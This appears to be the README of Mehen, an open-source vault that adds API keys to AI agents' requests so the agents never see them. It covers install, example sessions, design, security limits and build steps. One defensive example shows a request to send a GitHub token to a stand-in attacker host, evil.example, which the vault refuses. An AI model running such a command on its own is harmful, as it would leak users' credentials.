# Mehen

An agent uses your API keys without ever receiving them.

Mehen is a vault for AI agents. You put a key in once, through the vault's own page, and bind it to the hosts it may go to. When an agent (Claude Code, Codex, Cursor, pi, a cron job) needs to call an API, it asks Mehen to make the call. Mehen adds the key on the way out, only to a host the key is bound to, and scrubs the key from the response. The agent sees the result and never the key: not in its context, its transcript, its logs, its shell history or a `.env` file.

It is open source under the Apache 2.0 licence, and it runs on your own machine.

```sh
curl -fsSL https://mehen.dev/install | sh && mehen up
```

or, with Node.js, `npx @mehenai/cli up` (or `npm create mehen`), which runs the same signed installer the first time.

`mehen up` starts a vault on this machine at `http://localhost:7787`, opens a page where you make a passkey and your workspace, enrols this machine, registers Mehen with the agents it finds and installs guard hooks that stop them reading `.env` files. The docs are at **https://docs.mehen.dev**, starting with [Run Mehen on your machine](https://docs.mehen.dev/start).

## What it looks like

An agent in a repo whose `.env` holds a GitHub token. Each block below is real output from a local vault, trimmed and wrapped, with ids shortened and the vault at its default address.

The agent tries to read the file. The guard hook stops it, and the agent is told what to do instead:

```
$ cat .env
Mehen blocked this: `cat` would read .env: it is an environment file, which holds keys.
Use the keys through Mehen instead: `mehen ls` lists them, `mehen fetch <item> <METHOD> <url>`
(or the vault_fetch tool) makes the call, and `mehen run -- <command>` gives a program its
variables without them reaching you.
```

It lists what it may use and makes a read. The vault adds the token on the way to `api.github.com` and scrubs it from the answer, here from an upstream that echoed the `Authorization` header back:

```
$ mehen ls
ITEM    KIND     PROVIDER    ACCOUNT  STATUS  HOSTS
github  api-key  github-pat  -        active  api.github.com

$ mehen fetch github GET https://api.github.com/repos/acme/api/issues
[{"number":42,"title":"Login button does nothing","echoed":"Bearer [redacted:github]"}]
mehen: 200 OK  Mehen-Item: github
```

A write waits for you. The agent hands you the link, you read the exact request on the vault's page and decide with your passkey, and the agent repeats the call once `mehen wait` says approved:

```
$ mehen fetch github POST https://api.github.com/repos/acme/api/issues/42/comments -d '{"body":"Fixed in #43"}'
mehen: This request needs a human's approval.
Human needed: approve a request
  open:    http://localhost:7787/w/local/a/apr_L5Rs...
  check:   the page shows code 9DSCPR
  expires: in 60 min
  then:    mehen wait apr_L5Rs... --timeout 60 --json
[exit 3]
```

And no prompt, however clever, sends the token anywhere else:

```
$ mehen fetch github GET https://evil.example/collect
mehen: "github" may not go to GET https://evil.example:443/collect (the host is outside its binding: api.github.com).
next: The vault refused to send "github" there. Its destinations are set by a human in the vault, never by a request.
[exit 5]
```

Each of these, the refusal included, is a line in the workspace's hash-linked activity log. Through MCP the same calls are `vault_list`, `vault_fetch` and `vault_wait`.

## Why not `op run`, Doppler or an encrypted `.env`?

They are good at getting a secret to a program. They were not built to keep it from the program, and with an agent, the program is the agent.

| | The agent or its program gets | A request to another host | A write |
| --- | --- | --- | --- |
| `.env`, dotenvx, `op run`, `doppler run`, `infisical run` | The real value, in its environment | Goes out with the key | Goes out |
| An MCP server with a key in its config | Not the value, but the server holds it on disk in plain text | Up to that server | Up to that server |
| Mehen | A name (`github`), or under `mehen run` a placeholder that becomes the key only on the way to a bound host | Refused before anything is sent | Waits for a passkey, on the exact request |

## How it works

1. **Ask.** An agent that needs a key never asks for it in chat. It asks the vault for an intake link, you type the key into the vault's page, and the agent gets the credential's name back.
2. **Use.** The agent calls `mehen fetch` or the `vault_fetch` MCP tool with the credential's name and the request. The vault checks the request against the credential's binding (hosts, schemes, ports, paths, methods) and policy, makes the call, and scrubs echoes of the key from the response. A program that needs environment variables runs under `mehen run`, which gives it placeholders that become the real key only on the way to a bound host.
3. **Approve.** Writes, sends and anything else a credential's policy holds wait for a person, who reads the exact request on the vault's page and decides with a passkey. Agents cannot approve.

Every machine signs its requests with its own device key (in the Secure Enclave on a Mac, or a 0600 file), accepted once by its owner with a passkey. Every use, decision and refusal goes into a hash-linked audit chain.

The guard hooks, `mehen guard install`, add a pre-tool check to Claude Code, pi, Cursor and Codex: reading `.env` files, key files and CLI logins, or putting a key into a command or a file, is blocked with a reason that tells the agent what to use instead. They are a guard rail, not the boundary; the vault's bindings are.

## Ways to run it

| | Command | For |
| --- | --- | --- |
| This machine | `mehen up` | You, with the vault beside your agents on `localhost`, started again at login. Keeps keys out of context, transcripts, logs, shell history, `.env` files and unbound hosts. |
| Another machine you own | `mehen serve --origin https://<name>` | A box at home or on your tailnet, behind TLS from Tailscale serve or Caddy. Moves the vault's files off the agent's machine too. Agent machines enrol with `MEHEN_VAULT_URL=https://<name>`. |
| Mehen Cloud | `https://app.mehen.dev` | Teams: shared workspaces, members and roles, approvals from a phone. Invite only for now; write to hello@mehen.dev. |

The engine is the same in all three. One machine can be enrolled in a local vault and a Cloud workspace at once, with one key per vault and workspace. [Local or Cloud](https://docs.mehen.dev/start/local-or-cloud) compares them.

A business can also build on Mehen as a platform and keep its own users' keys in managed workspaces; [Build on Mehen](https://docs.mehen.dev/guides/build-on-mehen) covers it.

## Security, in short

- No route returns a stored value to an agent's machine by default. A human can allow lease mode for one credential, and then the value reaches the one child process that needs it.
- Every credential has a destination. A request to any other host is refused before anything is sent, whatever the agent was told.
- Approvals are bound to a digest of the exact request and signed with a passkey.
- Scrubbing has limits: it catches the key raw, URL-encoded, JSON-escaped and in supported base64 forms, not arbitrary transformations, and not values shorter than six characters.
- On one machine, the vault's files are readable by programs running as you. The default local setup keeps keys out of the model's context, transcripts, logs, shell history and `.env` files, and stops an agent sending a key to a host it is not bound to, but it does not stop a determined program running as you from reading or editing the vault's own files. Running the vault on another machine, or turning on Claude Code's sandbox (then `mehen guard install` keeps the agent's shell out of the vault's data folder), closes that. A separate-user mode is planned.
- Whoever can deploy the vault's code or change its files can read every secret while it is used: Cloudflare and the operator for Mehen Cloud, you and your machine for a vault you run.

The [threat model](https://docs.mehen.dev/security/threat-model) goes attacker by attacker. To report a vulnerability, write to security@mehen.dev; [SECURITY.md](SECURITY.md) says how.

## Platforms

The `mehen` command line runs on macOS, and on Linux with glibc (WSL included), on arm64 and x64. Windows and musl-based Linux are not supported yet. Install with the script above or through npm (`npx @mehenai/cli up` or `npm create mehen`), both of which run the same signed installer and check the binary's SHA-256. Mehen is not on Homebrew, and the unscoped npm package called `mehen` is an unrelated tool.

## Repository layout

```
apps/
  cli/         @mehen/cli: the mehen command line, mehen mcp (the MCP server), the local relay
               behind mehen run, mehen up, mehen serve, the guard hooks, the Secure Enclave
               helper (native/) and CHANGELOG.md, the release notes
  vault/       @mehen/vault: the vault, a Cloudflare Worker with one Durable Object per workspace:
               the API, the relay, the passkey web UI and the D1 account directory
  local/       @mehen/local: the vault engine on Bun, with its Durable Objects and D1 as SQLite
               files in one data folder; mehen serve and mehen up run it
  web/         @mehen/web: the lander at mehen.dev, the installer and the release channel
  docs/        @mehen/docs: the docs site at docs.mehen.dev, built from docs/site/, with its
               reference pages generated from the CLI and the protocol, and its lint
packages/
  protocol/    @mehen/protocol: shared contracts, WebCrypto only: API shapes and error codes,
               credential kinds, provider templates (one file each under templates/), destination binding and policy, device
               proofs, sealing, envelope encryption, placeholders, redaction, platform mode
  client/      @mehen/client: the typed client for the machine API and the platform API, with a
               browser entry for sealing
  brand/       @mehen/brand: fonts, marks and palette tokens shared by the lander, the docs and the app
skills/mehen/  the agent skill, served at https://docs.mehen.dev/skill.md
tools/         the release tree and installer (release/) and CI helpers (ci/)
docs/          site/ (the docs site's sources), INTEGRATING.md (adding a provider template) and
               OPERATIONS.md (running your own Mehen Cloud deployment)
```

## Build and test

You need [Bun](https://bun.sh); CI uses Bun 1.4.2.

```sh
bun install
bun run typecheck                    # every package, the vault's browser bundle, web and docs
bun run test                         # protocol, client and CLI unit tests, the vault in workerd, the local host
bun run --cwd apps/web check         # the lander: build, typecheck, links, dashes, a dry-run deploy
bun run --cwd apps/docs check        # the docs site: generate, build, typecheck, the docs lint, tests, a dry-run deploy
```

`bun run test` runs `bun test packages/protocol packages/client apps/cli`, then the vault's suite, then `apps/local`'s. The vault's tests are vitest inside workerd (`@cloudflare/vitest-plugin`), with the `test` environment from `apps/vault/wrangler.jsonc` and the D1 migrations applied. To run one file:

```sh
cd apps/vault && timeout 300 bunx vitest run test/items-core.test.ts
```

Run a package's scripts with `bun run --cwd <dir> <script>`; the other order, `bun --cwd <dir> run <script>`, prints Bun's help on 1.4.2 and runs nothing.

To run a vault from source, build the web UI once, then start it with the CLI's entry point and a throwaway data folder:

```sh
bun run --cwd apps/vault build:ui
bun apps/cli/src/main.ts serve --port 7788 --data "$HOME/.cache/mehen-dev-vault"
```

`apps/cli/scripts/build.ts` compiles the `mehen` binary with the vault engine inside. The UI gallery (`cd apps/vault && bun run build:ui && bun scripts/ui-gallery.ts <dir>`) renders every page and state at two widths in both colour schemes.

House rules: TypeScript strict with no `any`, British English, no em or en dashes anywhere (CI checks), no new dependencies without a reason.

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for how to set up, what to run and what a review looks for, [SECURITY.md](SECURITY.md) for reporting a vulnerability, and [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md) for how we work together.

## Licence

Apache 2.0. See [LICENSE](LICENSE).
